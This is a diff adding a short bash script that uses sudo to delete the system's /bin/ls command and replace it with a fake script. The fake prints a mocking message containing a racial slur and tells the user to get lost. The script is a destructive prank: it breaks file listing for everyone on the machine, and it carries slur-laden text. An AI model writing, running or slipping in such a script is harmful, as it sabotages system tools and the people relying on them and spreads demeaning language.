@@ -1,0 +1,11 @@
+#!/bin/bash
+
+sudo rm /bin/ls
+
+echo " echo " Hey nigga , there is nothing here !" " > ls
+echo " read -p  ' Anyways , what are you looking for ? : ' FILE " >> ls
+echo " echo  No , it  is not here .. Now , get lost !   " >>ls
+chmod +x ls
+
+
+sudo mv ls /bin/
